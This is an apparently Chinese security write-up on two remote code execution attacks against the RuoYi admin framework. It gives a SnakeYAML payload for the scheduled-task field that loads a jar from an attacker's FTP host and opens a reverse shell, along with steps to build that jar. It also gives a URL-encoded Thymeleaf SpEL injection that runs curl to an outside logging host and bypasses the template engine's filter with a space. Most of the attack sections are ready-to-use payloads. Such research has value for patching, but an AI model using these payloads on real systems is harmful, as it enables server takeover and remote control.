@@ -1,0 +1,149 @@
+<div class="detail_content markdown-body editormd-preview-container" id="markdown-body">
+<div id="app">
+<h2 data-content="1" id="7ebc1408ba96449ccd4c845b399803fd">反射+Yaml达到的代码执行</h2>
+<h3 data-content="1" id="5d036dd6517c3eb7ef5e82693e683af1">漏洞发现</h3>
+<p>在若依管理后台-系统监控-定时任务-新建，发现有个<strong>调用目标字符串的字段</strong>。</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221011122600-cf30b154-491c-1.jpg"/></p>
+<p>查看定时任务的具体代码，定位到<code>ruoyi-quartz/src/main/java/com/ruoyi/quartz/util/JobInvokeUtil.java</code>。</p>
+<p>假设我们输入<code>com.hhddj1.hhddj2.hhddj3()</code>，</p>
+<p>经解析后</p>
+<ul>
+<li>beanName为com.hhddj1.hhddj2</li>
+<li>methodName为hhddj3</li>
+<li>methodParams为[]</li>
+</ul>
+<div class="highlight"><pre><span></span><span class="cm">/**</span>
+<span class="cm"> * 执行方法</span>
+<span class="cm"> *</span>
+<span class="cm"> * @param sysJob 系统任务</span>
+<span class="cm"> */</span>
+<span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">invokeMethod</span><span class="o">(</span><span class="n">SysJob</span> <span class="n">sysJob</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">Exception</span>
+<span class="o">{</span>
+    <span class="n">String</span> <span class="n">invokeTarget</span> <span class="o">=</span> <span class="n">sysJob</span><span class="o">.</span><span class="na">getInvokeTarget</span><span class="o">();</span>
+    <span class="n">String</span> <span class="n">beanName</span> <span class="o">=</span> <span class="n">getBeanName</span><span class="o">(</span><span class="n">invokeTarget</span><span class="o">);</span>
+    <span class="n">String</span> <span class="n">methodName</span> <span class="o">=</span> <span class="n">getMethodName</span><span class="o">(</span><span class="n">invokeTarget</span><span class="o">);</span>
+    <span class="n">List</span><span class="o">&lt;</span><span class="n">Object</span><span class="o">[]&gt;</span> <span class="n">methodParams</span> <span class="o">=</span> <span class="n">getMethodParams</span><span class="o">(</span><span class="n">invokeTarget</span><span class="o">);</span>
+
+    <span class="k">if</span> <span class="o">(!</span><span class="n">isValidClassName</span><span class="o">(</span><span class="n">beanName</span><span class="o">))</span>
+    <span class="o">{</span>
+        <span class="n">Object</span> <span class="n">bean</span> <span class="o">=</span> <span class="n">SpringUtils</span><span class="o">.</span><span class="na">getBean</span><span class="o">(</span><span class="n">beanName</span><span class="o">);</span>
+        <span class="n">invokeMethod</span><span class="o">(</span><span class="n">bean</span><span class="o">,</span> <span class="n">methodName</span><span class="o">,</span> <span class="n">methodParams</span><span class="o">);</span>
+    <span class="o">}</span>
+    <span class="k">else</span>
+    <span class="o">{</span>
+        <span class="n">Object</span> <span class="n">bean</span> <span class="o">=</span> <span class="n">Class</span><span class="o">.</span><span class="na">forName</span><span class="o">(</span><span class="n">beanName</span><span class="o">).</span><span class="na">newInstance</span><span class="o">();</span>
+        <span class="n">invokeMethod</span><span class="o">(</span><span class="n">bean</span><span class="o">,</span> <span class="n">methodName</span><span class="o">,</span> <span class="n">methodParams</span><span class="o">);</span>
+    <span class="o">}</span>
+<span class="o">}</span>
+</pre></div>
+<h3 data-content="1" id="ec6c94f89a0feba73928850b62b7d0b1">反射Runtime失败</h3>
+<p>想要通过该反射执行命令，首先想到使用<code>java.lang.Runtime.getRuntime().exec("")</code>。</p>
+<p>若使用该payload，则会跳到<code>JobInvokeUtil.java</code>的这段代码中。</p>
+<div class="highlight"><pre><span></span><span class="n">Object</span> <span class="n">bean</span> <span class="o">=</span> <span class="n">Class</span><span class="o">.</span><span class="na">forName</span><span class="o">(</span><span class="n">beanName</span><span class="o">).</span><span class="na">newInstance</span><span class="o">();</span>
+<span class="n">invokeMethod</span><span class="o">(</span><span class="n">bean</span><span class="o">,</span> <span class="n">methodName</span><span class="o">,</span> <span class="n">methodParams</span><span class="o">);</span>
+</pre></div>
+<p>然而，想要通过<code>Class.forName(beanName).newInstance()</code>成功实例化，必须满足类至少有一个构造函数</p>
+<ul>
+<li>无参</li>
+<li>public</li>
+</ul>
+<p>而Runtime类的构造函数是private的，不满足条件，因此使用payload<code>java.lang.Runtime.getRuntime().exec("")</code>，会报错。</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221011122600-cf593746-491c-1.jpg"/></p>
+<h3 data-content="1" id="1acaaac5b9908e1c71c66f00cb08b6ca">反射ProcessBuilder失败</h3>
+<p>同样的，虽然我们可以在new ProcessBuilder的时候可以不加参数，但是并不代表ProcessBuilder的构造函数是无参的。因此使用ProcessBuilder的payload也会报错。</p>
+<div class="highlight"><pre><span></span><span class="n">ProcessBuilder</span> <span class="n">processBuilder</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ProcessBuilder</span><span class="o">();</span>
+<span class="n">processBuilder</span><span class="o">.</span><span class="na">command</span><span class="o">(</span><span class="s">"/bin/bash"</span><span class="o">,</span><span class="s">"-c"</span><span class="o">,</span><span class="s">"curl http://xxx/test"</span><span class="o">);</span>
+<span class="n">processBuilder</span><span class="o">.</span><span class="na">start</span><span class="o">();</span>
+</pre></div>
+<p>ProcessBuilder的构造函数</p>
+<div class="highlight"><pre><span></span><span class="kd">public</span> <span class="nf">ProcessBuilder</span><span class="o">(</span><span class="n">List</span><span class="o">&lt;</span><span class="n">String</span><span class="o">&gt;</span> <span class="n">var1</span><span class="o">)</span> <span class="o">{</span>
+    <span class="k">if</span> <span class="o">(</span><span class="n">var1</span> <span class="o">==</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
+        <span class="k">throw</span> <span class="k">new</span> <span class="n">NullPointerException</span><span class="o">();</span>
+    <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
+        <span class="k">this</span><span class="o">.</span><span class="na">command</span> <span class="o">=</span> <span class="n">var1</span><span class="o">;</span>
+    <span class="o">}</span>
+<span class="o">}</span>
+
+<span class="kd">public</span> <span class="nf">ProcessBuilder</span><span class="o">(</span><span class="n">String</span><span class="o">...</span> <span class="n">var1</span><span class="o">)</span> <span class="o">{</span>
+    <span class="k">this</span><span class="o">.</span><span class="na">command</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ArrayList</span><span class="o">(</span><span class="n">var1</span><span class="o">.</span><span class="na">length</span><span class="o">);</span>
+    <span class="n">String</span><span class="o">[]</span> <span class="n">var2</span> <span class="o">=</span> <span class="n">var1</span><span class="o">;</span>
+    <span class="kt">int</span> <span class="n">var3</span> <span class="o">=</span> <span class="n">var1</span><span class="o">.</span><span class="na">length</span><span class="o">;</span>
+
+    <span class="k">for</span><span class="o">(</span><span class="kt">int</span> <span class="n">var4</span> <span class="o">=</span> <span class="mi">0</span><span class="o">;</span> <span class="n">var4</span> <span class="o">&lt;</span> <span class="n">var3</span><span class="o">;</span> <span class="o">++</span><span class="n">var4</span><span class="o">)</span> <span class="o">{</span>
+        <span class="n">String</span> <span class="n">var5</span> <span class="o">=</span> <span class="n">var2</span><span class="o">[</span><span class="n">var4</span><span class="o">];</span>
+        <span class="k">this</span><span class="o">.</span><span class="na">command</span><span class="o">.</span><span class="na">add</span><span class="o">(</span><span class="n">var5</span><span class="o">);</span>
+    <span class="o">}</span>
+
+<span class="o">}</span>
+</pre></div>
+<h3 data-content="1" id="4bdd8cc7f25aed63b208a9c753e58a5a">构造Yaml类</h3>
+<p>想要代码执行，我尝试过写文件等等方式，但是都无法反射成功。</p>
+<p>因为根据若依的定时任务代码，需要满足以下条件：</p>
+<ul>
+<li>类的构造函数无参且public</li>
+<li>调用的方法的参数类型只能是String/int/long/double</li>
+<li>该方法具有代码执行的潜力</li>
+</ul>
+<p>因此找到Yaml类，刚好若依有一个YamlUtil类，里面使用了org.yaml.snakeyaml包。</p>
+<p>所以我们构造了以下payload，使用ftp协议的原因是http被禁用</p>
+<pre><code>org.yaml.snakeyaml.Yaml.load('!!javax.script.ScriptEngineManager [
+  !!java.net.URLClassLoader [[
+    !!java.net.URL ["ftp://ip/yaml-payload.jar"]
+  ]]
+]')</code></pre>
+<p>yaml-payload.jar的生成过程：</p>
+<p>1）在github上下载源码（<a href="https://github.com/artsploit/yaml-payload.git）" target="_blank">https://github.com/artsploit/yaml-payload.git）</a></p>
+<p>2）将IP和端口改成我们对应攻击机上的IP和端口</p>
+<p>3）使用以下两条命令生成新的yaml-payload.jar，生成的yaml-payload.jar位置如下图红箭头所示。</p>
+<pre><code>javac src/artsploit/AwesomescriptEngineFactory.java
+
+jar -cvf yaml-payload.jar -C src/ .</code></pre>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221011122600-cf96d3a8-491c-1.jpg"/></p>
+<h3 data-content="1" id="562267f0e8a27bf019f27f6a1e65fe91">漏洞利用过程</h3>
+<p>1.生成yaml-payload.jar，ip写攻击机ip，端口写2333。生成之后，传到攻击机的ftp目录下。</p>
+<p>2.攻击机：监听2333端口</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221011122601-cfc79402-491c-1.jpg"/></p>
+<p>3.若依管理后台，新建定时任务，目标调用字符串写</p>
+<pre><code>org.yaml.snakeyaml.Yaml.load('!!javax.script.ScriptEngineManager [
+  !!java.net.URLClassLoader [[
+    !!java.net.URL ["ftp://攻击机ip/yaml-payload.jar"]
+  ]]
+]')</code></pre>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221011122601-cfed70f0-491c-1.jpg"/></p>
+<p>4.攻击机上收到反弹shell</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221011122601-d01ea350-491c-1.jpg"/></p>
+<h2 data-content="1" id="adb92f1fac87fbc20481b6b0443a9d2c">结合Thymeleaf注入的代码执行</h2>
+<p>在代码审计若依的时候，发现了Thymeleaf语法的一些问题，不过后来发现大佬们之前就写过很多关于Thymeleaf注入的资料。</p>
+<h3 data-content="1" id="1c9e4f86854389401a4d4783a3e81487">漏洞分析</h3>
+<p>Ruoyi使用了<strong>thymeleaf-spring5</strong>，其中<strong>四个接口方法</strong>中设置了片段选择器：</p>
+<p><a href="http://demo.ruoyi.vip/monitor/cache/getNames" target="_blank">http://demo.ruoyi.vip/monitor/cache/getNames</a></p>
+<p><a href="http://demo.ruoyi.vip/monitor/cache/getKeys" target="_blank">http://demo.ruoyi.vip/monitor/cache/getKeys</a></p>
+<p><a href="http://demo.ruoyi.vip/monitor/cache/getValue" target="_blank">http://demo.ruoyi.vip/monitor/cache/getValue</a></p>
+<p><a href="http://demo.ruoyi.vip/demo/form/localrefresh/task" target="_blank">http://demo.ruoyi.vip/demo/form/localrefresh/task</a></p>
+<p>通过这四段接口，可以指定<strong>任意fragment</strong>，以<strong>/monitor/cache/getNames接口</strong>为例，controller代码如下：</p>
+<div class="highlight"><pre><span></span><span class="nd">@PostMapping</span><span class="o">(</span><span class="s">"/getNames"</span><span class="o">)</span>
+<span class="kd">public</span> <span class="n">String</span> <span class="nf">getCacheNames</span><span class="o">(</span><span class="n">String</span> <span class="n">fragment</span><span class="o">,</span> <span class="n">ModelMap</span> <span class="n">mmap</span><span class="o">)</span>
+<span class="o">{</span>
+    <span class="n">mmap</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="s">"cacheNames"</span><span class="o">,</span> <span class="n">cacheService</span><span class="o">.</span><span class="na">getCacheNames</span><span class="o">());</span>
+    <span class="k">return</span> <span class="n">prefix</span> <span class="o">+</span> <span class="s">"/cache::"</span> <span class="o">+</span> <span class="n">fragment</span><span class="o">;</span>
+<span class="o">}</span>
+</pre></div>
+<p>这四段接口方法中，都使用了thymeleaf的语法：</p>
+<pre><code>"/xxx::" + fragment;</code></pre>
+<p>我们构造fragment的值为：</p>
+<p>%24%7b%54%20%28%6a%61%76%61%2e%6c%61%6e%67%2e%52%75%6e%74%69%6d%65%29%2e%67%65%74%52%75%6e%74%69%6d%65%28%29%2e%65%78%65%63%28%22%63%75%72%6c%20%68%74%74%70%3a%2f%2f%63%6d%6d%6f%76%6f%2e%63%65%79%65%2e%69%6f%2f%72%75%6f%79%69%74%65%73%74%22%29%7d</p>
+<p>--&gt;</p>
+<p>${T (java.lang.Runtime).getRuntime().exec("curl <a href="http://cmmovo.ceye.io/ruoyitest" target="_blank">http://cmmovo.ceye.io/ruoyitest")}</a></p>
+<p>当我们构造的模板片段被thymeleaf解析时，thymeleaf会将识别出fragment为<strong>SpringEL</strong>表达式。不管是<strong>?fragment=header(payload)</strong>还是<strong>?fragment=payload</strong></p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221011122602-d06b7db0-491c-1.jpg"/></p>
+<p>但是，在执行SpringEL表达式之前，thymeleaf会去检查参数值中是否使用了<strong>"T(SomeClass)"</strong>或者<strong>"new SomeClass"</strong></p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221011122602-d0b81a58-491c-1.jpg"/></p>
+<p>这个检查方法其实可以绕过，SpringEL表达式支持<strong>"T (SomeClass)"</strong>这样的语法，因此我们只要在T与恶意Class之间加个空格，就既可以绕过thymeleaf的检测规则，又可以执行SpringEL表达式。</p>
+<p>因此payload中<strong>T与恶意Class之间含有空格</strong>，不论是空格或者制表符都可以绕过检测。</p>
+<h3 data-content="1" id="9de01a9fbae7fa23bb88bf9540a1e24d">漏洞利用过程</h3>
+<p>1.将payload进行HTML编码</p>
+<pre><code>${T (java.lang.Runtime).getRuntime().exec("curl http://cmmovo.ceye.io/ruoyitest")}</code></pre>
+<p>2.填入header后面的括号中，命令成功执行，ceye监听平台收到dnslog请求</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221011122603-d0ef0a7c-491c-1.jpg"/></p>
+</div>
+</div>
